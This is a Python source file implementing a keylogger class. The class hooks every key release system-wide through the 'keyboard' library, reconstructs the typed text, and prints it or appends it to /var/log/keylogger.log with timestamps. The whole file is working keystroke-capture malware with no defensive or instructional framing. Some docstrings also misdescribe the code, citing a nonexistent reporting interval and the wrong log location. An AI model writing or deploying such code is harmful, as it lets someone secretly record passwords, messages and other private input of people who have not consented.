import keyboard
from datetime import datetime

class Keylogger:
    def __init__(self, report_method="stdout"):
        self.report_method = report_method
        self.log = ""
        self.filename = "/var/log/keylogger.log"
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "\n"
                self.log += name
                self.report()
                name = ""
            elif name == "decimal":
                name = "."
            elif name == "backspace":
                name = ""
                if len(self.log) > 0:
                    # emulate backspace
                    self.log = self.log[:-1]
            else:
                if name in ["ctrl", "alt", "shift", "alt gr"]:
                    name = ""
                else:
                    # name = name.replace(" ", "_")
                    # name = f"[{name.upper()}]"
                    name = ""
        self.log += name
        # # start reporting the keylogs
        # self.report()

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        with open(f"{self.filename}", "a") as f:
            f.write(self.log)
            f.flush()

    def report_to_stdout(self):
        """This method write on all logged keys on stdout"""
        print(f"{self.log}", end="")

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            if self.report_method == "file":
                self.report_to_file()
            else:
                self.report_to_stdout()
        self.log = ""

    def print_time(self):
        if self.report_method == "stdout":
            print(f"Started : {self.start_dt}\nEnded : {self.end_dt}")
        elif self.report_method == "file":
            self.start_dt = self.start_dt.strftime('%I:%M%p on %B %d, %Y')
            self.end_dt = self.end_dt.strftime('%I:%M%p on %B %d, %Y')
            with open(self.filename, mode="a") as f:
                f.write(f"Started : {self.start_dt}\nEnded : {self.end_dt}")
    
    def start(self):
        try:
            # record the start datetime
            self.start_dt = datetime.now()
            # start the keylogger
            keyboard.on_release(callback=self.callback)
            # block the current thread, wait until CTRL+C is pressed
            keyboard.wait()
        except KeyboardInterrupt:
            self.end_dt = datetime.now()
        finally:
            print()
            self.print_time()

if __name__ == "__main__":
    keylogger = Keylogger(report_method="stdout")
    keylogger.start()